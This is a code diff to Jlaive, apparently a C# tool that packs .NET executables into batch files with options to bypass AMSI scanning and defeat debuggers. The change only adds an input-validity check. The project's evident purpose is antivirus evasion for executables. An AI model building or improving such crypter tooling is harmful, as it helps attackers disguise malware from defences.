@@ -26,10 +26,18 @@ namespace Jlaive
 
         private void button2_Click(object sender, EventArgs e)
         {
-            byte[] pbytes = File.ReadAllBytes(textBox1.Text);
+            string path = textBox1.Text;
+            byte[] pbytes = File.ReadAllBytes(path);
 
             Random rng = new Random();
-            string stub = StubGen.CreateCS(pbytes, bypassAMSI.Checked, antiDebug.Checked, rng);
+            string stub;
+            if (IsAssembly(path)) stub = StubGen.CreateCS(pbytes, bypassAMSI.Checked, antiDebug.Checked, rng);
+            else
+            {
+                MessageBox.Show("Input file not valid assembly!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
             string tempfile = Path.GetTempFileName();
             CSharpCodeProvider csc = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
@@ -70,7 +78,5 @@ namespace Jlaive
 
             File.WriteAllText($"{AppDomain.CurrentDomain.BaseDirectory}\\{Path.GetFileNameWithoutExtension(textBox1.Text)}.bat", output.ToString(), Encoding.ASCII);
         }
-
-
     }
 }
